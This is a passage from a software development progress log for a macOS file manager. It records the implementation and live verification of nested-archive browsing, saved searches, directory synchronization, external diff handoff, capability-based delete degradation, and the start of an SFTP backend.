  test), `mountOnDiskPath(forOrigin:)` (reuse a prior extraction instead of re-spawning `bsdtar`), and
  `ancestry(ofMountOnDiskPath:)` (the enclosing members outermost-first for the breadcrumb — walks the
  temp→origin→enclosing-archive chain and reverses). +5 `NestedArchiveMapTests` → **325 core tests**,
  swiftformat/swiftlint-strict clean.
- **App (I/O + wiring).** NEW `NestedArchiveRegistry.swift` (`@MainActor` wrapper: the pure map + the
  FileManager side — recording, and confirming a reused temp still exists), owned by
  `BrowserWindowController` and shared across both panes via `PanelHost` (mirroring `ArchivePreviewCache`).
  NEW `PanelViewController+NestedArchive.swift`: `beginNestedArchiveEntry(for:)` extracts the member
  off-main and navigates in (reusing an extant extraction); `isNestedArchive`/`isWritableArchive` (the
  read-only gate); `archiveBreadcrumbAncestry()`. Wiring: `openCurrentEntry` routes a browsable-archive
  member *inside* an archive into the nested entry; `goUpWithinArchive` returns to the origin's parent
  focused on the origin when the mount has one; `PathBarView.rebuildArchiveLabel` takes the ancestry and
  renders the full chain; the write gates (F8 delete, F5/F6 add-into, ⌘V paste-into) switch from
  `isArchive` to `isWritableArchive`, and `beginTransfer` now guards a *local* destination so an F5
  toward a read-only nested archive (or a search pane) reports "can't copy here" instead of erroring
  deep in the queue. App `xcodebuild build` green.
- **Verified live via computer-use** (fresh Debug build after a full quit): browsed `outer.zip` →
  entered its `inner.zip` (breadcrumb `📦 outer.zip ▸ inner.zip`, inner `docs`/`hello.txt` shown); `..`
  returned to `outer.zip` root with the cursor **on `inner.zip`**. The **doubly-nested**
  `outer2.zip ▸ sub ▸ mid.zip ▸ inner.zip` browsed all four levels (full breadcrumb) and `..` from
  `inner.zip` landed at `mid.zip` root onto `inner.zip`. The File menu inside a nested archive showed
  **Copy to Other Panel enabled** but **Move to Trash / Delete Immediately / Pack / Rename / New Folder
  greyed** (read-only). **F5 copy-out** of `mid-note.txt` from the doubly-nested `mid.zip` landed
  byte-exact ("MID level") on real disk. Zero `.dirnex-rewrite-*` litter (reads never rewrite); the
  only temp is `DirnexExtract/` (purged at launch, like previews and F5). Fixtures deleted; app left on
  Home. NEXT M4: saved searches as places-strip virtual folders, deferred search niceties (tag chip,
  content-grep fallback); archive drag-drop-in and ⌥⌘V move-paste-in remain small follow-ons, and
  writing back through nesting (edit an inner archive, re-embed it) is the natural next archive-write item.

Progress (2026-07-12, M4 pass 11): **saved searches as places-strip virtual folders** landed —
the last open M4 checklist item (**that line is now `[x]`**), macOS's answer to Finder's Smart
Folders. Name the query behind a live results panel via **Go ▸ Save Search…**, and it lands in a
new **Searches** section of the sidebar (magnifier icon); clicking it re-runs the query into a
fresh virtual results tab; right-click → **Run Search / Rename… / Delete**. Reuses the whole
existing search stack (⌥F7 `SpotlightQuery` → `SpotlightSearchRunner` → virtual `.search` panel) —
a saved search is just that query + a name + a scope, persisted.
- **Core (pure, tested).** NEW `DirnexCore/…/Services/SavedSearch.swift` mirrors `Workspaces`
  *exactly* (name-as-identity): `SavedSearch` (name + `SpotlightQuery` + optional `scope: VFSPath?`,
  `id == name`) and `SavedSearches` (ordered, name-de-duped list: `save` overwrites-in-place-else-
  appends, `remove`, `rename` rejecting empty/collision, `move`, custom Codable that re-sanitizes on
  decode). To persist a query, `SpotlightQuery` gained `Codable` (synthesized — every field already
  was) plus `summaryPlainName` (the `summary` precedence without the display quotes, so the Save
  prompt prefills an editable default). New command `go.saveSearch` ("Save Search…", no shortcut —
  sidebar-driven, conflict-free). +15 tests (`SavedSearchTests` 13, a `SpotlightQuery` Codable +
  plain-name pair, a `CommandCatalog` saveSearch case) → **341 core tests**, swiftformat/swiftlint-
  strict clean. GOTCHA (recurring, hit again): the Testing `#expect` macro captures its argument
  immutably, so a `mutating` call (`list.save`/`rename`/`remove`) must be hoisted into a `let` first
  — see [[swift-testing-expect-optional-arithmetic]]'s sibling gotcha.
- **App (persistence + sidebar + save flow).** NEW `SavedSearchStore.swift` (UserDefaults JSON like
  `FavoritesStore`/`WorkspaceStore`, plus a `didChangeNotification` posted on every save so open
  sidebars — even in another window — rebuild live). `PanelTab` gained `searchQuery`/`searchScope`
  (session-only, never encoded), set when `openSearchResults` installs a results tab, so
  `saveCurrentSearch` can recover exactly what produced them; `runSavedSearch` re-runs a stored query
  against its *absolute* scope (not the pane's current dir). `SidebarViewController` grew a
  `.savedSearch` row + a **Searches** section (rebuilt on `didChangeNotification`), a magnifier
  template icon, a `NSMenuDelegate` context menu built lazily from `clickedRow` (empty ⇒ no menu on
  non-search rows), and Rename/Delete that mutate the store directly; Run + row-click route through a
  new `didActivateSavedSearch` delegate call the window controller runs on the active pane.
  `validateMenuItem` enables Save Search… only on a results pane carrying a query (`canSaveCurrentSearch`).
  Wiring: `go.saveSearch` in `CommandBinding` + `MainMenuBuilder` (Go menu, after Find Files…).
  App `xcodebuild build` green; new code confirmed in `Dirnex.debug.dylib`; touched files
  swiftformat/swiftlint-strict clean.
- **Verified live via computer-use** (fresh Debug build after a full quit; no overlay this session):
  Go ▸ **Save Search…** was greyed on a normal pane, enabled after a ⌥F7 "jmeter" search (3 hits) —
  the prompt prefilled the unquoted default **"jmeter"**, saved as "JMeter Stuff" → appeared under a
  new **Searches** header with a magnifier icon (sidebar rebuilt live). Clicking it re-ran into a
  fresh `*jmeter*` results tab (same 3 hits). Right-click → **Run / Rename… / Delete**: Rename →
  "Perf Tests" updated the row live; Delete removed the whole section live. Re-saved as "jmeter",
  **quit + relaunched** → the Searches section persisted with "jmeter" (while the virtual results
  tabs correctly did *not* restore); deleted it to leave the app clean on Home. NEXT M4: deferred
  search niceties (tag chip, content-grep fallback for non-indexed volumes); archive drag-drop-in and
  ⌥⌘V move-paste-in remain small follow-ons, and writing back through nesting (edit an inner archive,
  re-embed it) is the natural next archive-write item. **The M4 checklist is now fully `[x]`.**
- **Follow-on (same day): ⌘S saves the active search.** `go.saveSearch` gained a **⌘S** shortcut
  (distinct from ⌃⌘S Show Sidebar — the conflict checker compares key *and* modifiers, so they
  don't collide). Because `validateMenuItem` already gates it on `canSaveCurrentSearch`, AppKit
  only fires the key equivalent when a search-results tab carrying a query is active — on any
  other pane ⌘S is an inert no-op, not a mis-save. Verified live: the Go menu reads **Save
  Search… ⌘S**; ⌘S on the `*jmeter*` results tab opened the Save sheet; ⌘S on the normal `oleg`
  tab did nothing. `coversSaveSearch` updated to assert the shortcut + conflict-freedom (still
  **341 core tests**).
- **Bugfix (same day): New Tab (`+` / Cmd+T) on a search-results tab no longer errors.** `addTab`
  cloned the current tab's `panel.path`; on a results tab that path is the virtual `search:/…`,
  and a fresh tab (`hasLoaded == false`) made `activateTab` call `navigate(to:)` on it → a
  spurious **"No backend can handle search:/…"** alert (the results still rendered, since the
  shared table shows the snapshot, but the failed navigate fired the dialog). Fix (app-only,
  `PanelViewController+Tabs.newTab(basedOn:)`): when `isSearchResults`, the new tab **duplicates
  the results snapshot** (`PanelTab(panel:)` — `Panel` is a value type → an independent copy —
  marked `hasLoaded = true`, carrying `searchQuery`/`searchScope`) instead of navigating the
  un-listable path; the normal-directory and archive cases are unchanged (both are browsable).
  Verified live: `+` and Cmd+T on a `*jmeter*` results tab each opened another results view with
  **no dialog**, and Cmd+T on the normal `oleg` tab still opened a fresh same-directory tab.
- **Enhancement (same day): a saved search names its tab.** `PanelTab` gained a `customTitle`
  (session-only, like `searchQuery`); `title` returns it when set, else the path-derived label. On
  **Save Search…** the current results tab is relabeled with the given name (`refreshTabBar`), and
  re-running a saved search from the sidebar titles its new tab the same — so a `"jmeter"` results
  chip becomes **"JMeter search"** end-to-end, while an ad-hoc ⌥F7 search keeps the query-summary
  chip (`title:` threaded through `runSavedSearch`→`performSearch`→`openSearchResults`, defaulting
  `nil`). The duplicate-snapshot path (`newTab(basedOn:)`) copies `customTitle` too. The path-bar
  header still reads "🔍 Results for “jmeter”" (it usefully shows the underlying query). Verified
  live: saving "JMeter search" renamed the active chip; clicking the sidebar entry opened a second
  "JMeter search" tab; a fresh unsaved "postman" search still showed the `"postman"` chip.
- **Enhancement (same day): Searches section on top + a per-row delete button.** (1) The sidebar now
  leads with the **Searches** section, above Favorites/Volumes (`rebuild()` order; the safe-area top
  inset that clears the traffic lights applies to whichever section is first, so no layout change).
  (2) `SidebarCellView` gained an **always-visible trailing trash button** on saved-search rows
  (`onDelete` closure; a `didSet` runs `updateTrailingLayout`, which shows the button and reserves the
  label's trailing space against it — the eject and delete buttons share one trailing slot since a row
  is never both, and exactly one of three label-trailing constraints is active so the name never runs
  under a button). Clicking it (or the context-menu **Delete**, routed through the same path) raises a
  **warning sheet** — "Delete “name”? … No files are deleted." — removing the saved search only on
  confirm. (First cut revealed the button on hover, but it overlapped the name and was easy to miss —
  switched to always-visible with reserved space per user feedback.) Verified live: Searches renders
  first; both saved-search rows show the trash icon with the name truncating cleanly before it (no
  overlap); clicking it sheeted the confirm and Delete removed the row live; the context-menu Delete
  sheeted the same confirm; Cancel kept the row; both searches persisted across a relaunch.

### M5 — Network and sync (M)

- [x] `SFTPBackend`: connection manager, **key auth + password auth**; **browse + byte transfer +
      mid-file resume** all DONE and verified live (via the system `sftp` CLI, not
      swift-nio-ssh/libssh2 — the same sidestep M4 made with `bsdtar`). Copy-out (`get`) / copy-in
      (`put`), remote mkdir / rename / recursive-delete all run through the standard queue; an SFTP
      pane is writable (`[.read, .write, .rename]`) so the pass-5 grey-out + Trash-less
      confirmed-permanent-delete light up. **Password auth** (pass 9) via `SSH_ASKPASS` (no PTY
      needed) + Keychain storage. **Mid-file resume** (pass 10) — `copyFile` picks up a partial
      destination via `get -a`/`put -a` instead of restarting; verified live against a real server
- [x] **SMB shares + unified connection manager** (built + verified live 2026-07-14): browse/copy to another
      Mac / PC / NAS over SMB, and one place that keeps every saved remote — SFTP and SMB alike. SMB
      is done the OS-native way: macOS ships **no `smbclient`** CLI to shell out to, so the sidestep
      here is the **mounter**, not a client — `NetFSMountURLSync` / `mount_smbfs` mounts
      `smb://user@host/share` and the existing `LocalBackend` browses the resulting `/Volumes/…`
      tree, so every M2 op, sync-dirs, compare-by-content, and archive-over-SMB works unchanged —
      **no new `CompositeBackend` routing, no libsmb2 dependency** (the deliberate choice over a
      protocol `SMBBackend`, mirroring SFTP's system-CLI sidestep). Caps reuse the pass-5 degradation
      path (read/write/rename, no clone, Trash-varies → confirmed-permanent-delete). The **connection
      manager** unifies today's ephemeral SFTP registry with persisted saved servers: a
      `ServerConnection` / `ServerConnections` core (name-as-identity, like `SavedSearch`) + a
      `ServerConnectionStore` + a **Servers** sidebar section (mirrors **Searches**), plus a
      generalized Connect-to-Server prompt (protocol picker SFTP | SMB + Save). Subsumes the deferred
      "saved SFTP connections in the sidebar" item
- [x] Capability degradation: panels grey out unsupported ops per backend ✅ (per-path
      `capabilities(for:)`; no Trash → explicit permanent-delete confirm ✅; no clone →
      always chunked ✅) — driven off the owning backend's caps, ready for SFTP to plug into
- [x] Synchronize directories: two-panel diff view (left-only / right-only / differs /
      same ✅), by size+date or content ✅; selective sync actions through the queue ✅;
      per-row *direction override* ✅ (right-click a row → flip a copy the other way, or turn a
      copy into a delete; also resolves a bidirectional `differ` conflict by hand) — include/
      exclude per row already done
- [x] Compare by content: **byte compare ✅** (`ByteComparator`, drives sync `.content` mode) +
      **external-diff handoff ✅** (FileMerge/Kaleidoscope/BBEdit via `ExternalDiffTool` — a
      **Compare By Contents…** command plus a right-click **Compare with …** in the sync sheet)

Exit: mirror a local folder to a server over SFTP, verify with sync-dirs, all queued
and pausable; and browse/copy to an SMB share on another Mac or NAS, connected and
managed from the Servers sidebar.

Progress (2026-07-12, M5 pass 1): the **directory-synchronization comparison core** landed —
the tested, headless *comparison* half of the "Synchronize directories" item (its two-panel
diff-view UI + queue wiring is the next pass; boxes stay `[ ]` until that lands). Picked first
because it's pure Swift and slots straight into the core→app rhythm, whereas `SFTPBackend` needs
a swift-nio-ssh/libssh2 dependency + a live server to test against — the M5 infra gate, analogous
to M4's libarchive gate. Two new `DirnexCore/Services/` files, no changes to existing APIs:
- **`DirectorySync.swift`** — `DirectorySync.compare(left:right:leftBackend:rightBackend:
  comparison:tolerance:includingIdentical:isCancelled:contentsEqual:)` walks both trees in
  lock-step (iterative explicit-stack over a private `DirectoryPair{left,right,prefix}`, like
  `DirectorySizer`, so deep trees can't blow the call stack) and returns one `SyncEntry`
  (`relativePath`+`name`+`left:FileEntry?`+`right:FileEntry?`+`status`, `Identifiable` by
  relative path) per differing/one-sided item, **sorted by relativePath** (deterministic
  regardless of traversal order → stable tests + stable UI). `SyncStatus` = `leftOnly /
  rightOnly / leftNewer / rightNewer / differ / identical / typeMismatch`. Design decisions:
  (1) directories present on **both** sides are descended into but emit **no row** (rows =
  actionable file diffs + one-sided items); a directory on **only one** side is a **single**
  non-recursed subtree row (the app copies/deletes it wholesale, matching TC's collapsed
  folder row). (2) `SyncComparison.sizeAndDate` (size equal AND |Δmtime| ≤ `tolerance`,
  default **2 s** for FAT/exFAT coarseness, TC's value) vs `.content` (exact bytes; short-
  circuits on size mismatch, falls back to size+date for symlinks/specials). (3) content
  equality is an **injected** `contentsEqual` closure (default `ByteComparator.localFilesEqual`)
  so the engine needs no read-primitive on `VFSBackend` and tests drive content mode with a
  fake. (4) **SAFETY: a listing failure propagates** — an unreadable dir throws rather than
  reading as empty, because silently doing so could delete the other side's matching files in
  a mirror (contrast `DirectorySizer`, which *does* swallow — there a partial number is fine;
  here a partial listing is dangerous). `defaultAction(for:direction:)` derives the pre-checked
  per-row action for `SyncDirection.leftToRight / rightToLeft / bidirectional` → `SyncAction`
  (`none / copyToRight / copyToLeft / deleteLeft / deleteRight / conflict`): a mirror is
  authoritative (overwrites even a newer destination + prunes destination-only items),
  bidirectional unions + newer-wins + never deletes + flags `differ`/`typeMismatch` as
  `conflict`; a file-vs-dir `typeMismatch` is **always** `conflict` in every direction (the
  strict-and-safe stance from MultiRename — never auto-delete a whole dir to drop a file in).
- **`ByteComparator.swift`** — knocks out the byte-compare half of the "Compare by content"
  item: `ByteComparator.localFilesEqual(_:_:chunkSize:isCancelled:)` chunk-compares two local
  regular files (128 KB chunks, never loads whole files), short-circuits `false` on a size
  mismatch without reading, `true` on same-path/two-empties; throws `.unsupported` for a
  non-`.local` path (network read arrives with `SFTPBackend`) or a directory, and normalizes
  read failures to `VFSError` via a POSIX-errno recovery helper. (External-diff-tool handoff —
  FileMerge/Kaleidoscope/BBEdit — is the remaining slice of that item, an app-layer pass.)
+18 `DirectorySync` +9 `ByteComparator` tests → **368 core tests** (was 341). Whole thing
`swift test` green, swiftformat/swiftlint-strict clean; app target untouched (new files only,
no existing-API changes, so no rebuild needed). GOTCHA hit: swiftlint `large_tuple` (>2 members)
on the work-stack `(left,right,prefix)` triple → extracted the private `DirectoryPair` struct.
NEXT M5: the sync-dirs UI (two-panel diff view driven by `compare`, per-row action override,
apply through the M2 `FileOperationQueue`); then the SFTPBackend infra gate; capability
degradation; external-diff handoff.

Progress (2026-07-12, M5 pass 2): the **Synchronize Directories UI** landed — the diff-view +
apply half of the sync item (**that box now `[x]`**; byte-compare `[~]`). One new headless
command + three app files, wiring the pass-1 `DirectorySync` engine into a real sheet that
reconciles the two panes through the M2 queue. VERIFIED LIVE end-to-end (no overlay this
session, so fully mouse-driven). Pieces:
- **Command** (core): `CommandCatalog` gains `file.syncDirectories` ("Synchronize Directories…",
  `.file`, **no shortcut** → conflict-free; new `coversSyncDirectories` test → **369 core
  tests**). Wired app-side in `CommandBinding` (→ `synchronizeDirectories(_:)`) and
  `MainMenuBuilder` (File menu, right after Pack). GOTCHA: adding one command tipped the
  `CommandCatalog` main-enum body over swiftlint `type_body_length` 250 → moved the `workspace`
  array into the existing bottom extension (where window/application already live).
- **`SyncDirectoriesController.swift`** — the sheet (modeled on `MultiRenameController`,
  `presentAsSheet`-retained). A **Direction** segmented control (Left→Right / Both Directions /
  Right→Left) and a **Compare by** control (Size & Date / Content) over a diff `NSTableView`:
  columns *include-checkbox · Item (relativePath, "/"-suffixed for dirs) · leftFolder detail ·
  action glyph · rightFolder detail*. Action column = green →/← for a copy, red ✕ for a delete
  (which side is clear from the populated detail column), ⚠ for a conflict, each with a tooltip.
  A **direction change re-derives actions in memory** (`recomputeActions`, instant); a
  **comparison change re-runs `DirectorySync.compare` off-main** (content mode reads bytes) with
  a spinner. Footer reads "N to copy, M to delete · K conflicts skipped"; empty result →
  "The folders are already in sync." with Synchronize disabled. Conflicts render with a disabled
  checkbox (no safe action). GOTCHAS (swiftlint, both recurring): `large_tuple` on the columns
  array / `row(at:)` / `actionDisplay` → replaced with an `addColumn` helper, returning the
  `fileprivate` `Row` struct, and an `ActionStyle` struct; `type_body_length` on the class →
  moved the four `make*` view-builders into a same-file `private extension` (extensions don't
  count toward the type body). NOTE: `Row` had to be `fileprivate` (not `private`) because the
  `fileprivate row(at:)` accessor returns it.
- **`PanelViewController+Sync.swift`** — entry point + apply. `synchronizeDirectories(_:)`
  casts `host as? BrowserWindowController` to always use the **physical** left/right panes (so
  the direction controls match the on-screen layout regardless of focus), gates on two distinct
  real local folders (`canSynchronize`, also the `validateMenuItem` case), and presents the
  sheet. On commit: **copies are batched by destination directory** (multiple sources → one
  `FileOperation`) and enqueued under `.overwrite` (the user already decided in the diff — no
  per-file prompt; atomic temp-swap keeps the original safe), so the window's queue drives
  progress/undo exactly like F5; **deletes go to the Trash** off-main as one pass, journaled via
  `UndoRecord.trash`. A **delete count triggers a confirm sheet** first ("… will move N items to
  the Trash"). The relative path's parent always exists on the destination side (the engine only
  descends into both-sides dirs), so a nested copy's target directory is guaranteed present.
LIVE TEST (seeded both panes onto fixture trees via the `Dirnex.tabs.<side>` UserDefaults JSON):
the sheet listed exactly the 6 differences (identical `same.txt` correctly omitted) with
"5 to copy, 1 to delete"; Right→Left flipped every row (3 copy ←, 3 delete ✕, "3 to copy, 3 to
delete"); Content mode rescanned to the same 6; Synchronize (Left→Right) raised the delete
confirm, then on disk overwrote `changed.txt` with the newer left copy, copied `only_left.txt` +
the nested `sub/leftonly_nested.txt`, overwrote the nested `sub/nested.txt`, **recursively copied
the one-sided `leftdir/deep/x.txt` subtree**, and trashed `only_right.txt`; a re-scan then
reported "already in sync" (metadata preserved → idempotent). App `xcodebuild` + `swift test`
green, swiftformat/swiftlint-strict clean. NEXT M5: per-row direction override (flip one row);
the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server); capability degradation;
external-diff-tool handoff.

Progress (2026-07-12, M5 pass 3): **per-row direction override** — the one deferred niceness on
the sync item, **now `[x]`**. Right-click any diff row to override its action against the global
direction: flip a copy the other way, or turn a copy into a delete; a bidirectional `differ`
conflict (or a mirror row you disagree with) is resolved by hand this way. Two-part, core→app as
always:
- **Core** (pure, tested): `DirectorySync.availableActions(for status:) -> [SyncAction]` (+ a
  `SyncEntry.availableActions` convenience) — the *actionable* choices a user may assign to one
  row: a both-sides difference (`leftNewer`/`rightNewer`/`differ`) → `[.copyToRight, .copyToLeft]`
  (copy either way, never delete a file that exists on both sides); a one-sided item → propagate
  *or* delete from its side (`leftOnly`→`[.copyToRight, .deleteLeft]`, mirror for `rightOnly`);
  `identical` and `typeMismatch` → `[]` (no safe override — a file-vs-folder clash still can't be
  auto-resolved, matching the strict stance). `.none`/`.conflict` are deliberately absent (skip is
  the checkbox's job; conflict is a non-action). +5 tests → **374 core tests** (was 369).
- **App**: `SyncDirectoriesController` gains an `NSMenu` (delegate = self) on the diff table;
  `menuNeedsUpdate` rebuilds it per-click from `tableView.clickedRow` — one item per
  `availableActions`, a `.on` checkmark on the row's current action, target `setRowAction(_:)`
  (row in `tag`, `SyncAction` in `representedObject`); an empty list shows one disabled caption
  ("One side is a folder — resolve manually"). Picking an item sets the row's action + forces
  `included = true`, reloads that row, and recomputes the footer. Added a "Right-click a row to
  change its action" hint in the controls row. A direction/comparison change still re-derives
  defaults and drops overrides (documented behavior). GOTCHA (recurring, `file_length` this time,
  not `type_body_length`): the new menu tipped the controller over swiftlint's 500-line
  `file_length` → **split the diff-table + override-menu rendering into a companion file**
  `SyncDirectoriesController+DiffTable.swift` (data source + delegate + `NSMenuDelegate` +
  `ActionStyle`). That cross-file split forced widening `Row`, `rowCount`, `row(at:)`,
  `isActionable`, `toggleInclude`, `setRowAction`, `tableView`, `leftDir`, `rightDir` from
  `private`/`fileprivate` to internal (Swift `private` doesn't cross files; a `private`
  `tableView` in a `NSTableViewDelegate`-conforming type even resolves to the delegate *method* in
  the other file → "has no member 'clickedRow'" until widened). App `xcodebuild` (into `build/`
  via `-derivedDataPath build`, since the default DerivedData copy isn't the one LaunchServices
  launches) + `swift test` green, swiftformat/swiftlint-strict clean. VERIFIED LIVE end-to-end:
  seeded two fixture trees (`changed.txt` left-newer, `only_left.txt`, `only_right.txt`, identical
  `same.txt`); right-click `changed.txt` showed "✓ Copy to R / Copy to L" → picked Copy to L (glyph
  → ←); right-click `only_left.txt` showed "✓ Copy to R / Delete from L" → picked Delete from L
  (footer went "2 to copy, 1 to delete" → "1 to copy, 2 to delete"); Synchronize raised the
  **2-item** trash confirm (proving the overridden delete count drives it), and on disk `L/changed.txt`
  became the *right* copy (6 B "right", i.e. copied **leftward** per the override, NOT the L→R
  default's 34 B), `only_left.txt` was trashed from L (not copied to R), `only_right.txt` trashed
  from R — both panes refreshed to identical `changed.txt`+`same.txt`, no crash. NEXT M5: the
  `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server); capability degradation;
  external-diff-tool handoff (FileMerge/Kaleidoscope/BBEdit — the remaining `[~]` slice).

Progress (2026-07-12, M5 pass 4): **external-diff-tool handoff** — the remaining `[~]` slice of
Compare-by-content, **now `[x]`**. `ByteComparator` says *whether* two files differ; this opens them
side-by-side in a real diff tool to show *how*. Core→app as always:
- **Core** (pure, tested): `DirnexCore/Services/ExternalDiffTool.swift` — a value descriptor of a
  known diff app (`identifier`+`displayName`+`candidateExecutablePaths` most-preferred-first+
  `leadingArguments`) with `invocation(comparing:with:executableExists:)→ExternalDiffInvocation?`
  (executable + argv = `leadingArguments + [left, right]`; nil when not installed). Locating the
  launcher is an **injected** `(String)->Bool` probe, so the whole thing is testable with no real
  install. Registry `known` = `[.kaleidoscope, .bbEdit, .fileMerge]` (dedicated diff apps first,
  FileMerge/`opendiff` as the ships-with-Xcode fallback); `installed(where:)` filters, `preferred(
  identifier:where:)` honors a saved choice then falls back to the first installed. Paths: FileMerge
  `/usr/bin/opendiff`; Kaleidoscope `ksdiff` and BBEdit `bbdiff` under `/opt/homebrew/bin` then
  `/usr/local/bin`. +8 tests → **383 core tests** (was 374).
- **App**: `Dirnex/Browser/ExternalDiffLauncher.swift` — supplies the real probe
  (`FileManager.isExecutableFile`) and spawns the resolved invocation off-main via `Process`
  (`run()` then detach — never blocks on the GUI tool; streams → nullDevice), mirroring
  `ArchiveExtractor`. `preferredTool()` (cheap) titles/enables the menu; `compare(_:_:completion:)`
  reports `noToolInstalled` / `launchFailed` back on the main actor. Two entry points: (1) a
  right-click **Compare with <tool>…** item prepended to the sync sheet's row menu for any
  both-sides regular-file pair (wired via `SyncDirectoriesController.onCompare`); (2) a standalone
  **Compare By Contents…** File command (`file.compareByContents`, no shortcut → conflict-free;
  `coversCompareByContents` test) that diffs the two panes' **cursor** files (`comparableCursorPair`
  — both must be real local files and distinct; gates `validateMenuItem` via `canCompareByContents`).
  Failures surface through the existing `presentOperationFailure` alert ("No comparison tool found —
  install FileMerge/Kaleidoscope/BBEdit"). App `xcodebuild` (into `build/` via `-derivedDataPath
  build`) + `swift test` green, swiftformat/swiftlint-strict clean. VERIFIED the handoff mechanic
  live: only `/usr/bin/opendiff` is installed here → `preferred()` resolves FileMerge; spawning
  `opendiff <L> <R>` exactly as the launcher does launched FileMerge (confirmed via `pgrep`), then
  quit it. **NEXT M5:** the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server);
  capability degradation. A Settings picker for the preferred diff tool (the `preferred(identifier:)`
  hook already exists) is optional polish.

Progress (2026-07-12, M5 pass 5): **capability degradation** — the second remaining M5 item,
**now `[x]`**. Panels now decide what they offer off the *owning backend's* capabilities rather
than ad-hoc `path.backend == .local` / `isVirtualDirectory` checks, and the delete key degrades to
a confirmed permanent delete on a Trash-less backend — the exact mechanism `SFTPBackend` plugs into
(SFTP has no Trash, no APFS clone). Core→app as always; no SFTP needed to prove it (a partial-
capability test double stands in). Pieces:
- **Core** (pure, tested): `VFSBackend.capabilities(for path:) -> VFSCapabilities` added to the
  protocol with a **default returning the backend-wide `capabilities`** — a single-backend
  implementation is uniform, but a *routing* backend (the app's `CompositeBackend`) overrides it to
  report the caps of whichever concrete backend owns `path`. New `DeleteStrategy` enum (`trash /
  permanent / unsupported`) + `VFSCapabilities.deleteStrategy` computed property encode the
  degradation decision: `.write` absent → `.unsupported`; writable but no `.trash` → `.permanent`
  (SFTP); has `.trash` → `.trash`. `CopyEngine` now guards its clone attempt on
  `backend.capabilities(for: entry.path).contains(.clone)` so a no-clone backend goes **straight to
  chunked** instead of a doomed clone (`.clone` present on Local → unchanged). +7 tests → **390 core
  tests** (was 383): `deleteStrategy` mapping, the `capabilities(for:)` default, a `RoutingStub`
  proving per-path degradation, and a `PartialCapabilityBackend` (a `LocalBackend` decorator with a
  configurable capability set + a clone-call counter) proving CopyEngine skips the clone when
  `.clone` is absent and still attempts it when present. GOTCHA: swiftlint `empty_count` fired on the
  counter's `.count == 0` — renamed the property to `calls`.
- **App**: `CompositeBackend.capabilities(for:)` routes per path — `local.capabilities` for `.local`,
  `.read` for any virtual location (archive/search), cheap by design (no archive mount, like
  `volumeIdentifier(for:)`). `canWriteHere`/`canRenameHere` now read `backend.capabilities(for:
  panel.path).contains(.write/.rename)` (drops the `!isVirtualDirectory` prefix — a virtual pane
  already reports `.read`, and this is correct for a future writable-non-local SFTP where
  `isVirtualDirectory` would wrongly fire). `deleteSelection`/`validateMutatingItem` now branch on
  `capabilities(for:).deleteStrategy`: `.unsupported` → no-op/greyed, `.trash` on F8 → Trash (with the
  existing optional confirm), else (Shift+F8, or F8 on a Trash-less backend) → the confirmed
  permanent-delete path. The **top-level-archive rewrite delete** (`isWritableArchive` →
  `beginArchiveDelete`) still short-circuits *first* — archive writes are the app's separate
  rewrite path, not VFS caps. Left the watch / archive-extract·pack·drop guards on their intentional
  `path.backend == .local` gates (local-only machinery; SFTP-destination is a later SFTP pass — not
  refactored speculatively). New app test `DirnexTests/CompositeBackendTests.swift` (+3 → **7 app
  tests**) asserts the crux: local path = full caps (`deleteStrategy == .trash`), archive + search
  paths = `.read` (`deleteStrategy == .unsupported`). Behavior on today's backends is **identical by
  construction** (traced each branch: local delete = Trash, archive/search delete greyed, New
  Folder/rename greyed on virtual) — the change is degradation *infrastructure* + a behavior-
  preserving refactor, so the visible payoff arrives with SFTP. `swift test` (390) + app
  `xcodebuild test` (7) green, swiftformat/swiftlint-strict clean, app launches + quits cleanly.
  **NEXT M5 (last item):** the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 dependency + a live/
  dockerized SSH server to test against) — with per-path capabilities + `DeleteStrategy` now in
  place, an SFTP pane's grey-out and Trash-less delete-confirm work the moment the backend reports
  `[.read, .write, .rename]` (no `.trash`/`.clone`). Optional polish: Settings picker for the
  preferred diff tool.

Progress (2026-07-12, M5 pass 6): the **SFTPBackend read-only browse core** landed — the pure,
tested foundation of the last M5 item. Same sidestep M4 made for the libarchive gate: rather than
add a swift-nio-ssh/libssh2 dependency, the plan is to drive the **system `ssh`/`sftp` CLI** (ships
with macOS) behind an **injected transport**, so the whole backend is exercised with a fake and
needs *no live server* — the analogue of `ArchiveBackend`'s read-only first pass (browse first,
write/copy later). Box stays `[ ]` (no live transport, no writes, no app wiring, no server
verification yet); this is the browse half of "browse/copy through the standard queue". **Four new
DirnexCore files, purely additive (no existing-API changes, so the app is untouched and needs no
rebuild):**
- **`VFS/SFTPLocation.swift`** — the connection descriptor (`host`+`port`(=22)+`username`, `Codable`,
  **no secret** — the password/key passphrase is a Keychain reference the app resolves, so a location
  is safe to serialize into a tab/bookmark/id). Encodes to a `VFSBackendID` as `sftp://user@host:port`
  (the SFTP analogue of the on-disk path an archive id carries), with `init?(descriptor:)` /
  `init?(backendID:)` and `VFSBackendID.sftp(_:)`/`.sftpLocation`/`.isSFTP` extensions — kept in this
  file (not `VFSPath.swift`) so the addition is purely new-files. Username split at the **first** `@`,
  port at the **last** `:` (bracketed IPv6 literal noted as a later refinement, not a hole).
- **`VFS/SFTPTransport.swift`** — the injected boundary: `SFTPTransport` protocol (`listDirectory(_:)`
  → raw `ls -la` text, `statItem(_:)` → raw `ls -ld` line) + `SFTPTransportError{notFound /
  permissionDenied / failure(String)}` (the few shapes the backend maps onto `VFSError`). Synchronous
  (the backend is always called off-main); the app supplies a `Process`-driven impl, tests a fake.
- **`VFS/SFTPListingParser.swift`** — a **close cousin of `ArchiveTOCParser`** (same "8 fixed columns
  then a verbatim name" shape, same `nameField` column-skip so internal spaces survive, same
  `en_US_POSIX` `MMM d HH:mm`/`MMM d yyyy` date formats) but **flat** (one directory, no tree, no
  ancestor synthesis) — kept separate to avoid churning the heavily-tested archive parser. `ls -la` →
  `[Entry]` (name/kind/byteSize/mtime/**permissions**/symlinkDestination): drops the `total` header
  and the `.`/`..` rows, mode-char → kind (`d`/`l`/`-`/other), ` -> target` split for symlinks, mode
  string → POSIX bits, tolerates an ACL `+`/xattr `@` 11-char mode. `parseItem` reads the single
  `ls -ld` line.
- **`VFS/SFTPBackend.swift`** — the `VFSBackend` over the injected transport (a `struct`, like
  `ArchiveBackend`). `id == .sftp(location)`; **`capabilities == .read`** for now (advertising `.write`
  before copy-in works end-to-end would let the UI start a paste the backend can't finish — the honest
